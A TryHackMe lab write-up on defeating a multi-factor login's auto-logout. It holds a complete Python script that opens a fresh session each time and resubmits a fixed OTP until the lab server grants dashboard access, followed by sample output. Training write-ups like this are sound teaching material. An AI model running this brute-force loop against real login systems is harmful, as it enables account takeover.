---
title: 'TryHackMe - Multi-Factor Authentication'
description: 'Bypassing auto-logout and brute-forcing a hardcoded OTP.'
date: 2025-10-22
lastmod: 2026-07-07T18:33:34+0800
tag: 'TryHackMe · Learn · Easy'
---

## TryHackMe - Multi-Factor Authentication

This room covers common weaknesses in multi-factor authentication implementations. The earlier tasks review the theory behind MFA bypasses, while the final task requires a practical exploit against a vulnerable lab.

### Practical - Beating the Auto-Logout Feature

The lab enforces an auto-logout after a failed OTP attempt. Normally this would prevent brute-forcing the one-time code, because a failed attempt logs the user out entirely. The trick is to keep the login step and the OTP step in separate sessions: log in fresh each time, then submit the guessed OTP before the auto-logout triggers.

I wrote a Python script to automate this. It logs in, submits a hardcoded OTP, and repeats with a new session until the server accepts the code.

```python
import requests

login_url = 'http://mfa.thm/labs/third/'
otp_url = 'http://mfa.thm/labs/third/mfa'

credentials = {
    'email': 'thm@mail.thm',
    'password': 'test123'
}

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://mfa.thm',
    'Connection': 'close',
    'Referer': 'http://mfa.thm/labs/third/mfa',
    'Upgrade-Insecure-Requests': '1'
}

def is_login_successful(response):
    return "User Verification" in response.text and response.status_code == 200

def login(session):
    return session.post(login_url, data=credentials, headers=headers)

def submit_otp(session, otp):
    otp_data = {
        'code-1': otp[0],
        'code-2': otp[1],
        'code-3': otp[2],
        'code-4': otp[3]
    }
    return session.post(otp_url, data=otp_data, headers=headers, allow_redirects=False)

def is_login_page(response):
    return "Sign in to your account" in response.text or "Login" in response.text

def try_until_success():
    otp_str = '1337'

    while True:
        session = requests.Session()
        login_response = login(session)

        if is_login_successful(login_response):
            print("Logged in successfully.")
        else:
            print("Failed to log in.")
            continue

        print(f"Trying OTP: {otp_str}")
        response = submit_otp(session, otp_str)

        if is_login_page(response):
            print(f"Unsuccessful OTP attempt, redirected to login page. OTP: {otp_str}")
            continue

        if response.status_code == 302:
            location_header = response.headers.get('Location', '')
            print(f"Session cookies: {session.cookies.get_dict()}")

            if location_header == '/labs/third/dashboard':
                print(f"Successfully bypassed 2FA with OTP: {otp_str}")
                return session.cookies.get_dict()
            elif location_header == '/labs/third/':
                print(f"Failed OTP attempt. Redirected to login. OTP: {otp_str}")
            else:
                print(f"Unexpected redirect location: {location_header}. OTP: {otp_str}")
        else:
            print(f"Received status code {response.status_code}. Retrying...")

try_until_success()
```

After several attempts, one session finally received a redirect to the dashboard instead of being kicked back to the login page.

```shell
Logged in successfully.
Trying OTP: 1337
DEBUG: OTP submission response status code: 302
Session cookies: {'PHPSESSID': '********************'}
Successfully bypassed 2FA with OTP: 1337
```

With the valid session cookie, I accessed the dashboard directly and completed the task.
